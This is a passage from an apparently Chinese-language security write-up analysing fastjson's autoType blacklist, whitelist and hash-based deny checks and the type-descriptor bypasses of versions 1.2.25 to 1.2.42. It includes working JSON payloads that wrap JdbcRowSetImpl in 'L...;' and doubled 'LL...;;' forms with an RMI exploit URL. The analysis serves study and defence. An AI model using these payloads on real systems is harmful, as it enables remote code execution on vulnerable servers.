&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">accept</span> <span class="operator">=</span> acceptList[i];</span><br><span class="line">        <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">            <span class="comment">// 命中白名单 -&gt; 直接加载这个类</span></span><br><span class="line">            <span class="keyword">return</span> TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Step 2: 遍历黑名单 denyList</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> denyList[i];</span><br><span class="line">        <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">            <span class="comment">// 命中黑名单 -&gt; 抛出异常，禁止反序列化</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>如果没开启 autoType ，则是先使用黑名单匹配，再使用白名单匹配和加载。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Step 4: 如果 autoTypeSupport 没开，再检查黑名单和白名单</span></span><br><span class="line"><span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">    <span class="comment">// 再次黑名单检查</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> denyList[i];</span><br><span class="line">        <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 再次白名单检查</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">accept</span> <span class="operator">=</span> acceptList[i];</span><br><span class="line">        <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">            clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 注意：这里逻辑有点微妙，如果传了 expectClass 且不匹配，会抛异常</span></span><br><span class="line">            <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>最后，如果要反序列化的类和黑白名单都未匹配时，只有开启了 autoType 或者 expectClass 不为空也就是指定了 Class 对象时才会调用 <code>TypeUtils.loadClass</code> 加载。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Step 5: 如果 autoTypeSupport 开启，或者有期望类，则直接尝试加载</span></span><br><span class="line"><span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">    clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="哈希机制分析"><a href="#哈希机制分析" class="headerlink" title="哈希机制分析"></a>哈希机制分析</h3><p>在 <code>fastjson</code> <strong>1.2.42</strong> 版本中，官方依然保留了 <strong>黑白名单检测机制</strong>，但对实现方式做了关键调整：<strong>黑名单不再存储明文类名</strong>，而是改为 <strong>基于哈希（Hash）的匹配</strong>，避免安全研究人员通过源码直接提取黑名单类名，进而对旧版本发起攻击。</p>
<p>核心逻辑依旧集中在 <code>com.alibaba.fastjson.parser.ParserConfig</code> 类中。在此类中，黑白名单的哈希值存储结构如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="variable">autoTypeSupport</span> <span class="operator">=</span> AUTO_SUPPORT;    <span class="comment">// 是否启用 AutoType（自动类型反序列化）支持</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">long</span>[] denyHashCodes;                      <span class="comment">// 黑名单类名对应的哈希值数组</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">long</span>[] acceptHashCodes;                    <span class="comment">// 白名单类名对应的哈希值数组</span></span><br></pre></td></tr></table></figure></div>

<p>在静态代码块中，<code>denyHashCodes</code> 被直接赋值为一组敏感类的哈希值（使用 FNV-1a 算法计算而来）。例如：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">denyHashCodes = <span class="keyword">new</span> <span class="title class_">long</span>[]&#123;</span><br><span class="line">    -<span class="number">8720046426850100497L</span>, -<span class="number">8109300701639721088L</span>, -<span class="number">7966123100503199569L</span>,</span><br><span class="line">    -<span class="number">7766605818834748097L</span>, -<span class="number">6835437086156813536L</span>, -<span class="number">4837536971810737970L</span>,</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="number">8838294710098435315L</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>这些值对应了历史上常被用于攻击的高危类（如 <code>JdbcRowSetImpl</code>、<code>TemplatesImpl</code>、<code>JNDI</code> 相关类等），但具体类名已被隐藏，只保留哈希结果。</p>
<p>github 上有一个 <a class="link"   target="_blank" rel="noopener" href="https://github.com/LeadroyaL/fastjson-blacklist" >fastjson-blacklist<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 项目通过枚举类名爆破了部分哈希值对应的包名。</p>
<p>对于白名单类名，系统会在初始化阶段根据类名计算其哈希值并排序后存储：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span>[] hashCodes = <span class="keyword">new</span> <span class="title class_">long</span>[AUTO_TYPE_ACCEPT_LIST.length];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; AUTO_TYPE_ACCEPT_LIST.length; i++) &#123;</span><br><span class="line">    hashCodes[i] = TypeUtils.fnv1a_64(AUTO_TYPE_ACCEPT_LIST[i]);</span><br><span class="line">&#125;</span><br><span class="line">Arrays.sort(hashCodes);</span><br><span class="line">acceptHashCodes = hashCodes;</span><br></pre></td></tr></table></figure></div>

<p>计算字符串哈希的函数是 <code>com.alibaba.fastjson.util.TypeUtils#fnv1a_64</code>，这个函数使用 FNV-1a 算法，对类名进行哈希计算。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">long</span> <span class="title function_">fnv1a_64</span><span class="params">(String key)</span> &#123;</span><br><span class="line">    <span class="comment">// FNV-1a 64 位初始值（固定）</span></span><br><span class="line">    <span class="type">long</span> <span class="variable">hashCode</span> <span class="operator">=</span> <span class="number">0xcbf29ce484222325L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历字符串每个字符</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; key.length(); ++i) &#123;</span><br><span class="line">        <span class="type">char</span> <span class="variable">ch</span> <span class="operator">=</span> key.charAt(i); <span class="comment">// 取出字符</span></span><br><span class="line"></span><br><span class="line">        hashCode ^= ch; <span class="comment">// 异或字符</span></span><br><span class="line">        hashCode *= <span class="number">0x100000001b3L</span>; <span class="comment">// 乘以 FNV 素数</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>ParserConfig</code> 还提供了运行时扩展 API，允许动态添加类名到黑名单或白名单：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addDeny</span><span class="params">(String name)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (name == <span class="literal">null</span> || name.isEmpty()) <span class="keyword">return</span>;</span><br><span class="line">    <span class="type">long</span> <span class="variable">hash</span> <span class="operator">=</span> TypeUtils.fnv1a_64(name);</span><br><span class="line">    <span class="keyword">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">long</span>[] newArray = Arrays.copyOf(denyHashCodes, denyHashCodes.length + <span class="number">1</span>);</span><br><span class="line">    newArray[newArray.length - <span class="number">1</span>] = hash;</span><br><span class="line">    Arrays.sort(newArray);    <span class="comment">// 确保可二分查找</span></span><br><span class="line">    denyHashCodes = newArray;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAccept</span><span class="params">(String name)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (name == <span class="literal">null</span> || name.isEmpty()) <span class="keyword">return</span>;</span><br><span class="line">    <span class="type">long</span> <span class="variable">hash</span> <span class="operator">=</span> TypeUtils.fnv1a_64(name);</span><br><span class="line">    <span class="keyword">if</span> (Arrays.binarySearch(acceptHashCodes, hash) &gt;= <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">long</span>[] newArray = Arrays.copyOf(acceptHashCodes, acceptHashCodes.length + <span class="number">1</span>);</span><br><span class="line">    newArray[newArray.length - <span class="number">1</span>] = hash;</span><br><span class="line">    Arrays.sort(newArray);</span><br><span class="line">    acceptHashCodes = newArray;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>checkAutoType</code> 函数中，对类名的过滤同样也是通过计算查询哈希来实现的。例如下面这段代码是开启 <code>autoTypeSupport</code> 情况下的过滤：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 性能优化，类名规则通常不短于 3 个字符</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">long</span> <span class="variable">h3</span> <span class="operator">=</span> (((((BASIC ^ className.charAt(<span class="number">0</span>))</span><br><span class="line">        * PRIME)</span><br><span class="line">        ^ className.charAt(<span class="number">1</span>))</span><br><span class="line">        * PRIME)</span><br><span class="line">        ^ className.charAt(<span class="number">2</span>))</span><br><span class="line">        * PRIME;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="type">long</span> <span class="variable">hash</span> <span class="operator">=</span> h3;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">3</span>; i &lt; className.length(); ++i) &#123;</span><br><span class="line">        <span class="comment">// 由于类名规则是前缀匹配，因此需要边计算哈希边查表</span></span><br><span class="line">        hash ^= className.charAt(i);</span><br><span class="line">        hash *= PRIME;</span><br><span class="line">        <span class="comment">// 如果类名前缀包含在白名单中则直接加载类</span></span><br><span class="line">        <span class="keyword">if</span> (Arrays.binarySearch(acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 命中黑名单则直接拒绝</span></span><br><span class="line">        <span class="keyword">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="基于类型描述符绕过"><a href="#基于类型描述符绕过" class="headerlink" title="基于类型描述符绕过"></a>基于类型描述符绕过</h2><p>JVM 类型描述符（Type Descriptor）是一种字符串编码，用来在 .class 字节码里精确表示字段类型和方法签名（参数与返回值）。编译器、类加载器、反射、JNI、ASM 等都用它来识别类型。它是给机器看的“类型速记”，不是给人看的源码类型。</p>
<p>这里涉及到的类型描述符有：</p>
<p><strong>引用类型（任意类&#x2F;接口）</strong></p>
<ul>
<li><p>形式：<code>L</code> + <strong>内部类名</strong> + <code>;</code></p>
</li>
<li><p>“内部类名”（internal name）用 <strong>斜杠 <code>/</code></strong> 分隔包名；<strong>内部类</strong>用 <code>$</code>。</p>
<ul>
<li><code>java.lang.String</code> → <code>Ljava/lang/String;</code></li>
<li><code>java.util.Map$Entry</code> → <code>Ljava/util/Map$Entry;</code></li>
</ul>
</li>
</ul>
<p><strong>数组类型</strong></p>
<ul>
<li><p>形式：<code>[</code> + <strong>组件类型描述符</strong></p>
</li>
<li><p>多维数组就多个 <code>[</code>：</p>
<ul>
<li><code>int[]</code> → <code>[I</code></li>
<li><code>String[]</code> → <code>[Ljava/lang/String;</code></li>
<li><code>int[][]</code> → <code>[[I</code></li>
<li><code>Map&lt;String,Integer&gt;[][]</code>（泛型被擦除）→ <code>[[Ljava/util/Map;</code></li>
</ul>
</li>
</ul>
<p><code>com.alibaba.fastjson.util.TypeUtils#loadClass</code> 在加载目标类之前为了兼容带有描述符的类名，使用了递归调用来处理描述符中的 <code>[</code>、<code>L</code>、<code>;</code> 字符。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 尝试根据类名加载一个 Class 对象，并带有缓存与多种 ClassLoader 回退策略</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">    <span class="comment">// 如果类名为空，直接返回 null</span></span><br><span class="line">    <span class="keyword">if</span> (className == <span class="literal">null</span> || className.length() == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Step 1: 先从缓存 mappings 里取（提高性能，避免重复加载）</span></span><br><span class="line">    Class&lt;?&gt; clazz = mappings.get(className);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> clazz; <span class="comment">// 如果缓存里已经有了，直接返回</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Step 2: 如果是数组类型（以 [ 开头）</span></span><br><span class="line">    <span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">        <span class="comment">// 递归加载数组的组件类型</span></span><br><span class="line">        Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">        <span class="comment">// 构造一个 0 长度的数组对象，返回它的 Class 类型</span></span><br><span class="line">        <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Step 3: 如果是对象数组的内部表示形式（以 L 开头，以 ; 结尾）</span></span><br><span class="line">    <span class="comment">// 例如 &quot;Ljava/lang/String;&quot; 表示 String</span></span><br><span class="line">    <span class="keyword">if</span> (className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>)) &#123;</span><br><span class="line">        <span class="comment">// 去掉 L 和 ; 得到真实类名，再递归加载</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">newClassName</span> <span class="operator">=</span> className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因此就在这个位置出现了逻辑漏洞，攻击者可以使用带有描述符的类绕过黑名单的限制，而在类加载过程中，描述符还会被处理掉。</p>
<p>当然这里仅仅是绕过了<strong>开启 autoType</strong> 的情况，而如果是默认 <code>autoTypeSupport</code> 为 <code>false</code> 的情况下不会加载白名单以外的类。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.setProperty(<span class="string">&quot;fastjson.parser.autoTypeSupport&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<h3 id="引用类型绕过（1-2-25-1-2-41）"><a href="#引用类型绕过（1-2-25-1-2-41）" class="headerlink" title="引用类型绕过（1.2.25 - 1.2.41）"></a>引用类型绕过（1.2.25 - 1.2.41）</h3><p>在之前的 payload 类名上前后加上 <code>L</code> 和 <code>;</code> 即可：</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;rmi://127.0.0.1:1099/exploit&quot;</span><span class="punctuation">,</span> </span><br><span class="line">    <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>在 <code>TypeUtils#loadClass</code> 中这部分字符会被去掉。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Step 3: 如果是对象数组的内部表示形式（以 L 开头，以 ; 结尾）</span></span><br><span class="line"><span class="comment">// 例如 &quot;Ljava/lang/String;&quot; 表示 String[]</span></span><br><span class="line"><span class="keyword">if</span> (className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>)) &#123;</span><br><span class="line">    <span class="comment">// 去掉 L 和 ; 得到真实类名，再递归加载</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">newClassName</span> <span class="operator">=</span> className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="引用类型双写绕过（1-2-42）"><a href="#引用类型双写绕过（1-2-42）" class="headerlink" title="引用类型双写绕过（1.2.42）"></a>引用类型双写绕过（1.2.42）</h3><p>FastJson 在 1.2.42 版本还在 <code>checkAutoType</code> 中加入判断，如果类的第一个字符是 <code>L</code> 结尾是 <code>;</code>，则使用 <code>substring</code> 进行了去除。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义 FNV-1a 算法的两个常量</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">long</span> <span class="variable">BASIC</span> <span class="operator">=</span> <span class="number">0xcbf29ce484222325L</span>; <span class="comment">// 初始偏移量 offset_basis</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">long</span> <span class="variable">PRIME</span> <span class="operator">=</span> <span class="number">0x100000001b3L</span>;      <span class="comment">// 素数乘子 FNV prime</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 特殊处理：检测类名是否是 &quot;类型描述符&quot; 格式，比如 &quot;Lcom/xxx/YYY;&quot;</span></span><br><span class="line"><span class="comment">// 在 JVM 的字节码描述符中，对象类型会写成 L + 类名 + ;</span></span><br><span class="line"><span class="comment">// 例如：Lcom/sun/rowset/JdbcRowSetImpl; </span></span><br><span class="line"><span class="comment">// 这种写法如果不规范化，会绕过 fastjson 的黑白名单检查</span></span><br><span class="line"><span class="keyword">if</span> ( (((BASIC</span><br><span class="line">        ^ className.charAt(<span class="number">0</span>))               <span class="comment">// 把首字符加入哈希</span></span><br><span class="line">        * PRIME)</span><br><span class="line">        ^ className.charAt(className.length() - <span class="number">1</span>)) <span class="comment">// 再把尾字符加入哈希</span></span><br><span class="line">        * PRIME == <span class="number">0x9198507b5af98f0L</span>)       <span class="comment">// 魔数：等价于首=&#x27;L&#x27; 且 尾=&#x27;;&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 如果命中，说明当前类名是被 L...; 包裹的 JVM 类型描述符</span></span><br><span class="line">    <span class="comment">// 为了防止绕过，这里去掉首尾两个字符</span></span><br><span class="line">    <span class="comment">// 比如：Lcom/sun/rowset/JdbcRowSetImpl;  →  com/sun/rowset/JdbcRowSetImpl</span></span><br><span class="line">    className = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>由于这里只检测并去除一次 <code>L</code> 和 <code>;</code>，因此我们只需要双写绕过即可。</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;rmi://127.0.0.1:1099/exploit&quot;</span><span class="punctuation">,</span> </span><br><span class="line">    <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>FastJson 在 1.2.43 版本修复了上一个版本中双写绕过的问题。可以看到用来检查的 <code>checkAutoType</code> 代码添加了判断，如果类名连续出现了两个 <code>L</code> 将会抛出异常：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// FNV-1a 64 位哈希的固定参数</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">long</span> <span class="variable">BASIC</span> <span class="operator">=</span> <span class="number">0xcbf29ce484222325L</span>; <span class="comment">// offset_basis</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">long</span> <span class="variable">PRIME</span> <span class="operator">=</span> <span class="number">0x100000001b3L</span>;      <span class="comment">// FNV_prime</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 【外层特征检测】：仅用“首字符 + 尾字符”做一次滚动哈希指纹：(((BASIC ^ first) * PRIME) ^ last) * PRIME</span></span><br><span class="line"><span class="comment">// 若结果等于 0x9198507b5af98f0L，则判定该字符串呈现 JVM“对象类型描述符”样式：L...;</span></span><br><span class="line"><span class="keyword">if</span> ((((BASIC</span><br><span class="line">        ^ className.charAt(<span class="number">0</span>))                      <span class="comment">// 吸收首字符</span></span><br><span class="line">        * PRIME)</span><br><span class="line">        ^ className.charAt(className.length() - <span class="number">1</span>)) <span class="comment">// 再吸收尾字符</span></span><br><span class="line">        * PRIME == <span class="number">0x9198507b5af98f0L</span>)              <span class="comment">// 命中：形如 &quot;Lcom/foo/Bar;&quot; 的描述符</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 【内层特征检测】：再用“首两个字符”做滚动哈希：(((BASIC ^ c0) * PRIME) ^ c1) * PRIME</span></span><br><span class="line">    <span class="comment">// 若结果等于 0x09195c07b5af5345L（去掉前导 0 亦同），则说明前两个字符是 